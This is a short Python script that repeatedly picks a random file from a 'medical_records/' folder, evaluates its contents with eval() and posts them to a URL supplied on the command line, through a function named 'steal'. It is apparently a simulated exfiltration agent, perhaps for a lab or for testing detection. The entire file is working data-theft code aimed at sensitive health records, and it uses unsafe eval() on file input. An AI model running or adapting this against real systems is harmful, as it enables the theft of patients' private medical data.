import sys
import requests
import time
from os import listdir
from os.path import join, isfile
from random import seed, randint

seed(1)
folder = "medical_records/"
first_file_index = 0
seconds_to_sleep = 1

url_from_cli = sys.argv[1] if len(sys.argv) > 1 else None
url = url_from_cli or "http://127.0.0.1:8000/"

def steal(data):
    response = requests.post(url, json=data)
    print("Status Code: ", response.status_code)
    print("Response: ", response.json())

def get_random_file_name(files):
    number_of_files = len(files)
    last_file_index = number_of_files - 1
    random_index = randint(first_file_index, last_file_index)
    return files[random_index]

def start():
    global seconds_to_sleep
    while True:
        time.sleep(seconds_to_sleep)
        try:
            all_files = [file_name for file_name in listdir(folder) if isfile(join(folder, file_name))]
            filename_to_be_stole = get_random_file_name(all_files)
            with open(join(folder, filename_to_be_stole)) as file_to_be_stole:
                data = eval(file_to_be_stole.read())
                steal(data)
        except :
            print("something went wrong with stealing. try again...")
